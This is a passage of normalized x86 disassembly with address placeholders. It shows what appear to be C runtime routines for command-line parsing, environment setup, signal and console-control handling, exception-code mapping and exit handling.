mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + edx * 4 ] ebx
inc [ rw-data ]
pop edi
pop esi
pop ebx
pop ebp
retn
sub_454904
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
lea ebx [ ebp - 0x4 ]
lea esi [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
push 0x0
mov edx [ ebp + 0x8 ]
push edx
call [ ebp + 0x10 ]
add esp 0x8
jmp r-xdata
mov ecx [ ebx ]
mov al [ ecx ]
cmp al 0x20
je r-xdata
inc [ ebx ]
cmp al 0x9
je r-xdata
mov edx [ ebx ]
cmp [ edx ] 0x22
jne r-xdata
mov ecx [ ebx ]
mov al [ ecx ]
cmp al 0x20
je r-xdata
inc [ ebx ]
jmp r-xdata
mov edx [ ebx ]
push edx
call sub_44f174
pop ecx
inc eax
push eax
call sub_44ebd4
pop ecx
mov [ esi ] eax
mov [ rw-data ] eax
test eax eax
jne r-xdata
cmp al 0x9
je r-xdata
mov ecx [ ebx ]
mov al [ ecx ]
cmp al 0x22
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x0
jne r-xdata
push rw-data
call sub_454630
pop ecx
jmp r-xdata
test al al
jne r-xdata
mov edx [ ebx ]
cmp [ edx ] 0x22
jne r-xdata
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc [ ebx ]
inc [ ebx ]
jmp r-xdata
inc [ ebx ]
mov eax [ ebx ]
mov al [ eax ]
cmp al 0x20
je r-xdata
inc [ ebx ]
cmp al 0x9
je r-xdata
mov edx [ ebx ]
cmp [ edx ] 0x0
je r-xdata
mov ecx [ esi ]
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov eax [ ebx ]
mov al [ eax ]
cmp al 0x20
je r-xdata
mov edx [ esi ]
mov [ edx ] 0x0
inc [ esi ]
test edi edi
je r-xdata
cmp al 0x9
je r-xdata
push 0x0
mov edx [ ebp - 0xc ]
push edx
call [ ebp + 0x10 ]
add esp 0x8
mov ecx [ ebp + 0x10 ]
push ecx
mov eax [ ebp - 0xc ]
push eax
call [ rw-data ]
add esp 0x8
jmp r-xdata
test al al
jne r-xdata
inc [ ebx ]
mov ecx [ ebx ]
cmp [ ecx ] 0x0
je r-xdata
cmp al 0x22
jne r-xdata
mov ecx [ ebx ]
mov al [ ecx ]
cmp al 0x2a
je r-xdata
inc [ ebx ]
jmp r-xdata
mov edi 0x1
cmp al 0x3f
jne r-xdata
mov eax [ ebx ]
mov al [ eax ]
cmp al 0x22
je r-xdata
push ebx
push esi
call sub_454a78
add esp 0x8
mov edx [ ebx ]
cmp [ edx ] 0x22
jne r-xdata
test al al
jne r-xdata
inc [ ebx ]
jmp r-xdata
push ebx
push esi
call sub_454a78
add esp 0x8
sub_454a78
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov ecx [ eax ]
cmp [ ecx ] 0x5c
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ecx + 0x1 ] 0x22
jne r-xdata
mov esi [ eax ]
mov cl [ esi ]
xor ebx ebx
mov bl cl
test [ ebx + rw-data ] 0x4
je r-xdata
mov ecx [ eax ]
cmp [ ecx ] 0x5c
jne r-xdata
mov ecx [ edx ]
mov [ ecx ] 0x22
add [ eax ] 0x2
jmp r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
mov cl [ ecx ]
mov [ ebx ] cl
inc [ eax ]
cmp [ esi + 0x1 ] 0x0
je r-xdata
cmp [ ecx + 0x1 ] 0x5c
jne r-xdata
inc [ edx ]
pop esi
pop ebx
pop ebp
retn
mov ebx [ edx ]
mov [ ebx ] cl
inc [ eax ]
inc [ edx ]
mov ecx [ edx ]
mov [ ecx ] 0x5c
add [ eax ] 0x2
jmp r-xdata
sub_454aec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
lea ebx [ ebp - 0x4 ]
lea esi [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
push 0x0
mov edx [ ebp + 0x8 ]
push edx
call [ ebp + 0x10 ]
add esp 0x8
jmp r-xdata
mov ecx [ ebx ]
mov ax [ ecx ]
cmp ax 0x20
je r-xdata
add [ ebx ] 0x2
cmp ax 0x9
je r-xdata
mov edx [ ebx ]
cmp [ edx ] 0x22
jne r-xdata
mov ecx [ ebx ]
mov ax [ ecx ]
cmp ax 0x20
je r-xdata
add [ ebx ] 0x2
jmp r-xdata
mov edx [ ebx ]
push edx
call sub_44f358
pop ecx
add eax eax
add eax 0x2
push eax
call sub_44ebd4
pop ecx
mov [ esi ] eax
mov [ rw-data ] eax
test eax eax
jne r-xdata
cmp ax 0x9
je r-xdata
mov ecx [ ebx ]
mov ax [ ecx ]
cmp ax 0x22
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x0
jne r-xdata
push rw-data
call sub_454630
pop ecx
jmp r-xdata
test ax ax
jne r-xdata
mov edx [ ebx ]
cmp [ edx ] 0x22
jne r-xdata
test ax ax
jne r-xdata
xor edi edi
jmp r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
add [ ebx ] 0x2
add [ ebx ] 0x2
jmp r-xdata
add [ ebx ] 0x2
mov eax [ ebx ]
mov ax [ eax ]
cmp ax 0x20
je r-xdata
add [ ebx ] 0x2
cmp ax 0x9
je r-xdata
mov edx [ ebx ]
cmp [ edx ] 0x0
je r-xdata
mov ecx [ esi ]
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov eax [ ebx ]
mov ax [ eax ]
cmp ax 0x20
je r-xdata
mov edx [ esi ]
mov [ edx ] 0x0
add [ esi ] 0x2
test edi edi
je r-xdata
cmp ax 0x9
je r-xdata
push 0x0
mov edx [ ebp - 0xc ]
push edx
call [ ebp + 0x10 ]
add esp 0x8
mov ecx [ ebp + 0x10 ]
push ecx
mov eax [ ebp - 0xc ]
push eax
call [ rw-data ]
add esp 0x8
jmp r-xdata
test ax ax
jne r-xdata
add [ ebx ] 0x2
mov ecx [ ebx ]
cmp [ ecx ] 0x0
je r-xdata
cmp ax 0x22
jne r-xdata
mov ecx [ ebx ]
mov ax [ ecx ]
cmp ax 0x2a
je r-xdata
add [ ebx ] 0x2
jmp r-xdata
mov edi 0x1
cmp ax 0x3f
jne r-xdata
mov eax [ ebx ]
mov ax [ eax ]
cmp ax 0x22
je r-xdata
push ebx
push esi
call sub_454c9c
add esp 0x8
mov edx [ ebx ]
cmp [ edx ] 0x22
jne r-xdata
test ax ax
jne r-xdata
add [ ebx ] 0x2
jmp r-xdata
push ebx
push esi
call sub_454c9c
add esp 0x8
sub_454c9c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov ecx [ eax ]
cmp [ ecx ] 0x5c
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ecx + 0x2 ] 0x22
jne r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
mov cx [ ecx ]
mov [ ebx ] cx
add [ eax ] 0x2
mov ecx [ eax ]
cmp [ ecx ] 0x5c
jne r-xdata
mov ecx [ edx ]
mov [ ecx ] 0x22
add [ eax ] 0x4
jmp r-xdata
cmp [ ecx + 0x2 ] 0x5c
jne r-xdata
add [ edx ] 0x2
pop ebx
pop ebp
retn
mov ecx [ edx ]
mov [ ecx ] 0x5c
add [ eax ] 0x4
jmp r-xdata
sub_454d14
push ebx
push 0x100
call sub_44ebd4
pop ecx
mov ebx eax
mov [ rw-data ] ebx
test ebx ebx
jne r-xdata
push 0xff
mov eax [ rw-data ]
push eax
push 0x0
call GetModuleFileNameA
pop ebx
retn
push rw-data
call sub_454630
pop ecx
sub_454d7c
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push eax
call sub_44ebe4
pop ecx
xor edx edx
xor ecx ecx
mov [ rw-data ] edx
mov [ rw-data ] ecx
retn
push eax
call sub_44ebe4
pop ecx
sub_454db0
push ebx
push esi
push edi
push ebp
push ecx
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov ebx [ rw-data ]
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebx ]
test eax eax
jne r-xdata
xor ebp ebp
xor esi esi
mov ebx [ rw-data ]
jmp r-xdata
call GetEnvironmentStrings
mov [ rw-data ] eax
test eax eax
jne r-xdata
push eax
call sub_44f174
pop ecx
test eax eax
jne r-xdata
lea ebx [ esi + 0x4 ]
push 0x4
mov [ rw-data ] ebx
inc ebx
push ebx
call sub_44e6b0
add esp 0x8
test eax eax
mov [ esp ] eax
jne r-xdata
push ebx
call sub_44f174
pop ecx
mov edi eax
test eax eax
jne r-xdata
push rw-data
call sub_454630
pop ecx
inc esi
add ebx 0x4
dec esi
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
lea eax [ edi + 0x1 ]
inc esi
add ebp eax
add ebx eax
lea edi [ ebp + 0x1 ]
push edi
call sub_44ebd4
pop ecx
mov ebx eax
mov [ rw-data ] ebx
test ebx ebx
jne r-xdata
xor esi esi
mov ebx [ rw-data ]
mov eax [ esp ]
mov edi eax
jmp r-xdata
xor esi esi
mov ebx [ rw-data ]
mov eax [ esp ]
mov ebp eax
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
push edi
mov edx [ rw-data ]
push edx
push ebx
call sub_44f024
add esp 0xc
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx ]
test eax eax
jne r-xdata
push ebx
call sub_44f174
pop ecx
mov edi eax
test eax eax
jne r-xdata
push eax
call sub_44f174
pop ecx
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ ebp ] ebx
add ebp 0x4
inc esi
inc edi
add ebx edi
jmp r-xdata
dec esi
add edi 0xfffffffc
mov eax [ ebx ]
mov [ edi ] eax
jmp r-xdata
mov edx [ esp ]
mov eax 0x1
mov [ rw-data ] edx
push eax
call sub_44ebe4
pop ecx
add edi 0x4
inc esi
add ebx 0x4
sub_454efc
call sub_454db0
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
push rw-data
call sub_455864
add esp 0x8
retn
push rw-data
call sub_454630
pop ecx
retn
sub_454f30
push ebp
mov ebp esp
xor eax eax
mov edx rw-data
mov ecx [ ebp + 0x8 ]
pop ebp
retn
inc eax
add edx 0x4
cmp eax 0xa
jl r-xdata
cmp ecx [ edx ]
je r-xdata
or eax 0xffffffff
sub_454f50
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ebx
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
xor edx edx
mov [ ebp - 0x8 ] edx
call sub_45569c
mov esi eax
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
mov eax [ esi + 0x28 ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edi edi
mov edx [ ebx ]
cmp edx 0xc0000090
jg r-xdata
add edx 0x3fffff6f
cmp edx 0x5
ja r-xdata
je r-xdata
mov eax 0x1
jmp r-xdata
jmp [ edx * 4 + jump_table_454fea ]
mov ebx 0x2
mov [ ebp - 0x4 ] 0x81
mov edi 0x1
jmp r-xdata
cmp edx 0xc0000005
jg r-xdata
mov ebx 0x2
mov [ ebp - 0x4 ] 0x84
mov edi 0x8
jmp r-xdata
mov ebx 0x2
mov [ ebp - 0x4 ] 0x85
mov edi 0x10
jmp r-xdata
mov ebx 0x2
mov [ ebp - 0x4 ] 0x87
mov edi 0x49
jmp r-xdata
mov [ ebp - 0x4 ] 0x7f
mov ebx 0x2
jmp r-xdata
mov [ ebp - 0x4 ] 0x16
mov ebx 0x1
jmp r-xdata
mov esi [ eax + ebx * 4 ]
cmp esi 0x1
jne r-xdata
sub edx 0xc000001d
je r-xdata
je r-xdata
test esi esi
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x14
mov ebx 0x1
jmp r-xdata
sub edx 0x71
je r-xdata
mov [ ebp - 0x4 ] 0xc
mov ebx 0x3
jmp r-xdata
sub edx 0x80000003
je r-xdata
xor edx edx
cmp ebx 0x1
mov [ eax + ebx * 4 ] edx
je r-xdata
mov eax 0x1
jmp r-xdata
mov ebx 0x2
mov [ ebp - 0x4 ] 0x83
mov edi 0x4
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x4 ] 0x17
mov ebx 0x1
jmp r-xdata
dec edx
je r-xdata
call sub_452674
push 0x1f3f
mov ecx [ rw-data ]
push ecx
call sub_452688
add esp 0x8
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x4 ]
push edx
mov ecx [ ebx * 4 + rw-data ]
push ecx
call esi
mov eax [ ebp + 0x10 ]
add esp 0xc
not edi
and [ eax + 0x20 ] edi
jmp r-xdata
cmp ebx 0x3
je r-xdata
mov [ ebp - 0x4 ] 0x18
mov ebx 0x1
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx 0x2
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
push 0x0
mov ecx [ ebx * 4 + rw-data ]
push ecx
call esi
add esp 0xc
sub_45516c
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
mov ebx [ ebp + 0x8 ]
jne r-xdata
push ebx
call sub_454f30
pop ecx
mov esi eax
inc eax
jne r-xdata
mov [ rw-data ] sub_454f50
push 0x1
push sub_455148
call SetConsoleCtrlHandler
mov [ rw-data ] 0x1
cmp ebx 0x2
je r-xdata
call sub_45448c
mov [ eax ] 0x13
or eax 0xffffffff
jmp r-xdata
mov ebx rw-data
jmp r-xdata
cmp ebx 0x15
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + esi * 4 ]
mov edx [ ebp + 0xc ]
mov [ ebx + esi * 4 ] edx
call sub_45569c
mov edi eax
test eax eax
jne r-xdata
mov ebx [ edi + 0x28 ]
test ebx ebx
jne r-xdata
or eax 0xffffffff
jmp r-xdata
push 0x28
call sub_44ebd4
pop ecx
mov ebx eax
test eax eax
jne r-xdata
xor edx edx
mov eax ebx
call sub_45448c
mov [ eax ] 0x8
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
inc edx
mov [ eax ] ecx
add eax 0x4
cmp edx 0xa
jl r-xdata
mov [ edi + 0x28 ] ebx
sub_455220
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0x2
je r-xdata
mov edi rw-data
jmp r-xdata
cmp ebx 0x15
jne r-xdata
push ebx
call sub_454f30
pop ecx
mov esi eax
inc eax
jne r-xdata
call sub_45569c
mov esi eax
test eax eax
je r-xdata
mov eax [ edi + esi * 4 ]
cmp eax 0x1
je r-xdata
mov eax 0x1
jmp r-xdata
mov eax 0x1
jmp r-xdata
mov edi [ esi + 0x28 ]
test edi edi
jne r-xdata
xor eax eax
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor edx edx
mov [ edi + esi * 4 ] edx
xor edx edx
mov dl [ esi + rw-data ]
push 0x0
push edx
push ebx
call eax
add esp 0xc
add ebx 0xfffffff0
sub ebx 0x2
jb r-xdata
sub ebx 0x2
je r-xdata
sub ebx 0x2
je r-xdata
call sub_454648
jmp r-xdata
jmp r-xdata
push 0x3
call sub_4546f4
pop ecx
jmp r-xdata
sub_4552cc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x100
mov [ ebp - 0x10 ] 0x1
xor eax eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov eax 0xff
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0x8 ] eax
mov edx [ ebp + 0x8 ]
lea ecx [ edx + 0x4 ]
mov [ ebp - 0x14 ] ecx
jmp r-xdata
mov esi eax
cmp esi [ ebp - 0xc ]
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ edx ]
cmp ecx [ ebp - 0x8 ]
jg r-xdata
mov eax [ ebp - 0x14 ]
cmp [ ebp + 0xc ] 0x0
mov eax [ eax ]
je r-xdata
add esi [ ebp - 0x10 ]
cmp esi [ ebp - 0xc ]
jne r-xdata
mov edi [ eax ]
mov edi [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0x4 ]
mov edx [ eax + 0xc ]
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
add ebx 0xfffffffa
cmp edi ebx
ja r-xdata
mov ebx edi
cmp ebx [ ebp - 0x4 ]
jae r-xdata
mov [ ebp - 0x4 ] edx
cmp [ ebp + 0xc ] 0x0
jne r-xdata
inc [ ebp - 0x8 ]
add [ ebp - 0x14 ] 0x4
mov eax esi
cmp al [ ebx + 0x1 ]
jne r-xdata
mov eax esi
cmp al [ ebx + 0x1 ]
jne r-xdata
sub ebx 0x6
cmp edi ebx
jbe r-xdata
call [ ebx + 0x2 ]
add ebx 0x6
cmp ebx [ ebp - 0x4 ]
jb r-xdata
call [ ebx + 0x2 ]
jmp r-xdata
sub_4553a0
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov [ rw-data ] 0x1
push 0x1
push rw-data
call sub_4552cc
add esp 0x8
push 0x1
push rw-data
call sub_4552cc
add esp 0x8
call sub_4552c8
mov edi eax
test eax eax
je r-xdata
push 0x1
push edi
call sub_4552cc
add esp 0x8
xor esi esi
lea ebx [ edi + 0x4 ]
jmp r-xdata
cmp esi [ edi ]
jl r-xdata
mov eax [ ebx ]
mov edx [ eax + 0x14 ]
push edx
push 0x1
call [ eax + 0x18 ]
add esp 0x8
inc esi
add ebx 0x4
sub_4555fc
push ebx
add esp 0xffffff50
xor ebx ebx
mov [ esp + 0x1c ] 0x94
lea eax [ esp + 0x1c ]
push eax
call GetVersionExA
cmp [ esp + 0x2c ] 0x1
jne r-xdata
push 0x1c
lea eax [ esp + 0x4 ]
push eax
lea edx [ esp + 0x8 ]
push edx
call VirtualQuery
call sub_401140
add ebx [ esp + 0x4 ]
mov [ eax + 0xac ] ebx
add esp 0xb0
pop ebx
retn
mov ebx 0x10000
sub_4556c4
push ebx
mov eax [ rw-data ]
push eax
call sub_4558c8
pop ecx
mov ebx [ rw-data ]
test ebx ebx
je r-xdata
push 0x5c
call sub_44ebd4
pop ecx
mov ebx eax
test eax eax
je r-xdata
mov edx [ ebx ]
mov [ rw-data ] edx
jmp r-xdata
test ebx ebx
je r-xdata
push 0x5c
push 0x0
push ebx
call sub_44f094
add esp 0xc
mov ecx [ rw-data ]
push ecx
call sub_4558d8
pop ecx
mov eax ebx
pop ebx
retn
mov [ ebx + 0x44 ] 0x1
xor edx edx
xor ecx ecx
mov [ ebx + 0x48 ] edx
xor eax eax
mov [ ebx + 0x54 ] ecx
xor edx edx
mov [ ebx + 0x2c ] eax
mov [ ebx + 0x58 ] edx
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
push 0x0
mov edx [ ebx + 0x4c ]
push edx
call sub_44f094
add esp 0xc
mov ecx [ rw-data ]
push ecx
call sub_44ebd4
pop ecx
mov [ ebx + 0x4c ] eax
test eax eax
jne r-xdata
push ebx
call sub_44ebe4
pop ecx
xor ebx ebx
jmp r-xdata
sub_45576c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ rw-data ]
push eax
call sub_4558c8
pop ecx
mov edx [ rw-data ]
mov [ ebx ] edx
mov [ rw-data ] ebx
mov ecx [ rw-data ]
push ecx
call sub_4558d8
pop ecx
pop ebx
pop ebp
retn
sub_4557b4
push ebx
push esi
mov esi rw-data
call sub_401140
mov ebx [ eax + 0xb0 ]
test ebx ebx
je r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
push ebx
call sub_45576c
pop ecx
jmp r-xdata
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
test eax eax
je r-xdata
push eax
call sub_44ebe4
pop ecx
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_44ebe4
pop ecx
mov eax [ ebx + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_44ebe4
pop ecx
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
push eax
call sub_44ebe4
pop ecx
mov eax [ ebx + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_44ebe4
pop ecx
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
push eax
call sub_44ebe4
pop ecx
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
push eax
call sub_44ebe4
pop ecx
mov eax [ esi ]
mov ebx [ eax ]
push eax
call sub_44ebe4
pop ecx
mov [ esi ] ebx
push eax
call sub_44ebe4
pop ecx
sub_455864
push ebp
mov ebp esp
push rw-data
call EnterCriticalSection
cmp [ rw-data ] 0x200
jl r-xdata
mov edx [ rw-data ]
shl edx 0x3
lea edx [ edx + edx * 2 ]
add edx rw-data
push edx
call InitializeCriticalSection
mov ecx [ rw-data ]
mov eax [ ebp + 0x8 ]
shl ecx 0x3
lea ecx [ ecx + ecx * 2 ]
add ecx rw-data
mov [ eax ] ecx
push rw-data
inc [ rw-data ]
call LeaveCriticalSection
pop ebp
retn
mov eax [ ebp + 0xc ]
push eax
call sub_4558e8
pop ecx
sub_4558e8
push ebp
mov ebp esp
add esp 0xffffffb0
push esi
push edi
mov esi rw-data
lea edi [ ebp - 0x50 ]
mov eax edi
mov ecx 0x4
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov edx [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x50 ]
push ecx
call sub_44f138
add esp 0x8
lea eax [ ebp - 0x50 ]
push eax
call sub_454630
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_45596e
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
cmp edx 0xc0000092
jg r-xdata
cmp edx 0xc0000096
jg r-xdata
je r-xdata
sub edx 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
pop ebp
retn
cmp edx 0xc000008e
jg r-xdata
mov al 0xe
pop ebp
retn
sub edx 0x3d
je r-xdata
mov al 0xc
pop ebp
retn
sub edx 0xc0000093
je r-xdata
add edx 0x3fffff71
sub edx 0x2
jb r-xdata
je r-xdata
mov al 0xd
pop ebp
retn
jmp r-xdata
mov al 0x9
pop ebp
retn
dec edx
je r-xdata
je r-xdata
mov al 0x7
pop ebp
retn
sub edx 0xc0000005
je r-xdata
mov al 0x15
pop ebp
retn
mov al 0x3
pop ebp
retn
dec edx
je r-xdata
mov al 0x8
pop ebp
retn
jmp r-xdata
mov al 0xb
pop ebp
retn
sub edx 0x87
je r-xdata
mov al 0x5
pop ebp
retn
jmp r-xdata
mov al 0x4
pop ebp
retn
dec edx
je r-xdata
jmp r-xdata
sub_455a07
push ebp
mov ebp esp
add esp 0xffffffa8
mov eax rw-data
push ebx
push esi
push edi
call sub_44f3b0
push [ ebp + 0x8 ]
call sub_45596e
pop ecx
and eax 0xff
cmp eax 0x3
jl r-xdata
xor eax eax
mov edx [ ebp - 0x50 ]
mov [ fs : 0x0 ] edx
jmp r-xdata
cmp eax 0xf
jle r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ eax * 8 + rw-data ]
add eax 0xfffffffd
cmp eax 0xb
ja r-xdata
mov ecx rw-data
test ecx ecx
je r-xdata
jmp [ eax * 4 + jump_table_455a5c ]
mov di [ esi + 0x4 ]
test di 0x20
jne r-xdata
push 0x119
push rw-data
push rw-data
call sub_454374
add esp 0xc
mov [ ebp - 0x40 ] 0x8
mov edx rw-data
lea eax [ ebp - 0x4 ]
call sub_4595e4
inc [ ebp - 0x34 ]
mov ecx [ eax ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_457fc8
mov [ ebp - 0x58 ] eax
dec [ ebp - 0x34 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_459658
jmp r-xdata
mov [ ebp - 0x40 ] 0x14
mov edx rw-data
lea eax [ ebp - 0x8 ]
call sub_4595e4
inc [ ebp - 0x34 ]
mov ecx [ eax ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_458074
mov [ ebp - 0x58 ] eax
dec [ ebp - 0x34 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_459658
jmp r-xdata
mov [ ebp - 0x40 ] 0x20
mov edx rw-data
lea eax [ ebp - 0xc ]
call sub_4595e4
inc [ ebp - 0x34 ]
mov ecx [ eax ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_458120
mov [ ebp - 0x58 ] eax
dec [ ebp - 0x34 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_459658
jmp r-xdata
mov [ ebp - 0x40 ] 0x2c
mov edx rw-data
lea eax [ ebp - 0x10 ]
call sub_4595e4
inc [ ebp - 0x34 ]
mov ecx [ eax ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4581cc
mov [ ebp - 0x58 ] eax
dec [ ebp - 0x34 ]
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_459658
jmp r-xdata
mov [ ebp - 0x40 ] 0x38
mov edx rw-data
lea eax [ ebp - 0x14 ]
call sub_4595e4
inc [ ebp - 0x34 ]
mov ecx [ eax ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_458278
mov [ ebp - 0x58 ] eax
dec [ ebp - 0x34 ]
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_459658
jmp r-xdata
mov [ ebp - 0x40 ] 0x44
mov edx rw-data
lea eax [ ebp - 0x18 ]
call sub_4595e4
inc [ ebp - 0x34 ]
mov ecx [ eax ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_458324
mov [ ebp - 0x58 ] eax
dec [ ebp - 0x34 ]
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_459658
jmp r-xdata
mov [ ebp - 0x40 ] 0x50
mov edx rw-data
lea eax [ ebp - 0x1c ]
call sub_4595e4
inc [ ebp - 0x34 ]
mov ecx [ eax ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4583d0
mov [ ebp - 0x58 ] eax
dec [ ebp - 0x34 ]
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_459658
jmp r-xdata
mov [ ebp - 0x40 ] 0x5c
mov edx rw-data
lea eax [ ebp - 0x20 ]
call sub_4595e4
inc [ ebp - 0x34 ]
mov ecx [ eax ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_45847c
mov [ ebp - 0x58 ] eax
dec [ ebp - 0x34 ]
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_459658
jmp r-xdata
mov [ ebp - 0x40 ] 0x68
mov edx rw-data
lea eax [ ebp - 0x24 ]
call sub_4595e4
inc [ ebp - 0x34 ]
mov ecx [ eax ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_458528
mov [ ebp - 0x58 ] eax
dec [ ebp - 0x34 ]
lea eax [ ebp - 0x24 ]
mov edx 0x2
call sub_459658
jmp r-xdata
mov [ ebp - 0x40 ] 0x74
mov edx rw-data
lea eax [ ebp - 0x28 ]
call sub_4595e4
inc [ ebp - 0x34 ]
mov ecx [ eax ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4585d4
mov [ ebp - 0x58 ] eax
dec [ ebp - 0x34 ]
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_459658
jmp r-xdata
mov [ ebp - 0x40 ] 0x80
mov edx rw-data
lea eax [ ebp - 0x2c ]
call sub_4595e4
inc [ ebp - 0x34 ]
mov ecx [ eax ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_458680
mov [ ebp - 0x58 ] eax
dec [ ebp - 0x34 ]
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_459658
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0x54 ] eax
push 0x56
call sub_455df9
mov ebx eax
xor eax eax
pop ecx
xor ecx ecx
mov [ ebx ] eax
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ ebx + 0xc ] 0x2
mov [ ebx + 0x10 ] 0x4
mov [ ebx + 0x18 ] di
mov [ ebx + 0x1a ] 0x0
mov edx [ ebp - 0x54 ]
mov [ ebx + 0x14 ] edx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x28 ] eax
xor edx edx
mov [ ebx + 0x2c ] edx
xor ecx ecx
mov [ ebx + 0x1c ] sub_455e43
mov [ ebx + 0x34 ] ecx
xor eax eax
mov [ ebx + 0x38 ] eax
xor edx edx
mov [ ebx + 0x20 ] edx
xor ecx ecx
mov [ ebx + 0x24 ] ecx
mov [ ebx + 0x45 ] 0x0
mov [ ebx + 0x44 ] 0x1
mov eax [ ebp + 0xc ]
mov [ ebx + 0x46 ] eax
lea eax [ ebp - 0x58 ]
mov edx [ ebp + 0x10 ]
mov [ ebx + 0x4a ] edx
lea edx [ ebx + 0x52 ]
mov ecx [ ebp + 0x14 ]
mov [ ebx + 0x4e ] ecx
push 0x4
push eax
push edx
call sub_44f024
add esp 0xc
mov eax ebx
mov edx [ ebp - 0x50 ]
mov [ fs : 0x0 ] edx
push 0x11e
push rw-data
push rw-data
call sub_454374
add esp 0xc
sub_455df9
